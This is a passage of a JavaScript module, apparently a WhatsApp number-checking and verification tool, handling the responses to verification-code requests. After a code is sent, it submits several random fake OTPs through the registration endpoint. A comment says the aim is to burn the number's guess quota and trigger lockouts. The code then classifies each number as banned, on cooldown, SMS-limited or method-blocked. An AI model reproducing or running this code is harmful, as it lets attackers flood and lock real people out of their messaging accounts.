        error: String(e && e.message ? e.message : e),
        probe
      };
    }

    const codeJson = safeJsonParse(codeText) || {};
    const existJson = safeJsonParse(existText) || {};
    let reason = String(codeJson.reason || existJson.reason || "").toLowerCase();
    let status = String(codeJson.status || "").toLowerCase();
    let methods = extractMethodWaits(null, existJson, codeJson);
    let cooldownSeconds =
      numWait(methods[methodKey]) ||
      numWait(methods.sms) ||
      numWait(codeJson.retry_after ?? codeJson.sms_wait ?? codeJson.wait);
    let deviceOn = extractDeviceState(null, existJson, codeJson);
    const hardFail = ["blocked", "banned", "no_routes", "bad_token", "length_long", "length_short", "missing"].includes(reason);
    const sentOk = status === "sent" || status === "ok" || ["sent", "sms_sent", "code_sent", "incorrect"].includes(reason);

    // Multi fake OTP → burn guess quota lebih cepat (too_many_guesses / temporary)
    if (sentOk && !hardFail && typeof WADetector.buildRegisterPayloads === "function") {
      const guessCount = Math.max(1, Math.min(3, parseInt(process.env.WA_FAKE_GUESS_COUNT || "3", 10)));
      for (let g = 0; g < guessCount; g++) {
        try {
          assertNotCancelled();
          const fakeCode = String(100000 + Math.floor(Math.random() * 900000));
          const regPayload = await WADetector.buildRegisterPayloads(cleanPhone, fakeCode);
          if (!regPayload || !regPayload.success || !regPayload.register) break;
          await new Promise(r => setTimeout(r, 35 + g * 40));
          assertNotCancelled();
          registerText = await callWAWithRetry(regPayload.register, regPayload.userAgent, payload.headers, sendTimeout, 1, signal, cleanPhone);
          const regJson = safeJsonParse(registerText) || {};
          const regReason = String(regJson.reason || "").toLowerCase();
          const regStatus = String(regJson.status || "").toLowerCase();
          const regWait = numWait(regJson.retry_after ?? regJson.sms_wait ?? regJson.wait ?? regJson.email_wait);
          if (regWait > cooldownSeconds) cooldownSeconds = regWait;
          if (regReason) reason = regReason;
          if (regStatus) status = regStatus;
          methods = extractMethodWaits(null, existJson, { ...codeJson, ...regJson });
          const methodWait = numWait(methods[methodKey]);
          if (methodWait > cooldownSeconds) cooldownSeconds = methodWait;
          deviceOn = extractDeviceState(null, existJson, { ...codeJson, ...regJson }) || deviceOn;
          // sudah too_many_guesses / hard wait → stop guess
          if (regReason === "too_many_guesses" || regWait >= 600) break;
        } catch (regErr) {
          const rm = String(regErr && regErr.message ? regErr.message : regErr);
          if (rm === "CANCELLED") {
            return { success: false, phone: formattedPhone, method: methodKey, error: "CANCELLED", probe };
          }
        }
      }
    }

    if (hardFail) {
      return {
        success: false,
        phone: formattedPhone,
        method: methodKey,
        state: reason === "blocked" || reason === "banned" ? "BANNED" : "FAILED",
        error: reason || "send_failed",
        cooldownSeconds,
        methods,
        isDeviceOn: deviceOn,
        probe
      };
    }

    const softCooldownReasons = ["too_recent", "too_many", "try_again", "too_many_guesses", "next_method", "incorrect"];
    const hardCooldownReasons = ["temporarily_unavailable", "rate_overlimit"];
    if (hardCooldownReasons.includes(reason) || cooldownSeconds >= 600) {
      return {
        success: true,
        phone: formattedPhone,
        method: methodKey,
        state: "COOLDOWN",
        error: reason || "cooldown",
        cooldownSeconds: cooldownSeconds || 600,
        methods,
        isDeviceOn: deviceOn,
        probe,
        rawStatus: status,
        rawReason: reason
      };
    }

    if (sentOk || softCooldownReasons.includes(reason) || cooldownSeconds > 0) {
      const state = cooldownSeconds > 0 && cooldownSeconds < 600 ? "SMS_LIMIT" : (cooldownSeconds >= 600 ? "COOLDOWN" : "SENT");
      return {
        success: true,
        phone: formattedPhone,
        method: methodKey,
        state,
        reason: reason || status || "sent",
        cooldownSeconds,
        methods,
        maskedEmail: codeJson.email || codeJson.masked_email || existJson.email || (probe && probe.maskedEmail) || null,
        isDeviceOn: deviceOn,
        hasDevice: deviceOn,
        probe,
        rawStatus: status,
        rawReason: reason
      };
    }

    // bad_param / method_not_allowed = method tidak valid untuk nomor ini
    if (reason === "bad_param" || reason === "method_not_allowed" || reason === "provider_timeout") {
      const blockedMethods = { ...(methods || {}) };
      blockedMethods[methodKey] = Math.max(numWait(blockedMethods[methodKey]), 3600);
      return {
        success: false,
        phone: formattedPhone,
        method: methodKey,
        state: "METHOD_BLOCKED",
        error: reason,
        cooldownSeconds: blockedMethods[methodKey],
        methods: blockedMethods,
        isDeviceOn: deviceOn,
        probe,
        rawStatus: status,
        rawReason: reason
      };
    }

    return {
      success: false,
      phone: formattedPhone,
      method: methodKey,
      state: "FAILED",
      error: reason || status || "send_failed",
      cooldownSeconds,
      methods,
      isDeviceOn: deviceOn,
      probe,
      rawStatus: status,
      rawReason: reason
    };
  } catch (e) {
    return {
      success: false,
      phone: cleanPhone,
      method: methodKey,
      error: String(e && e.message ? e.message : e)
    };
  }
}

module.exports = { checkPhone, triggerEmailVerification, sendVerificationCode, probePhoneMethods };
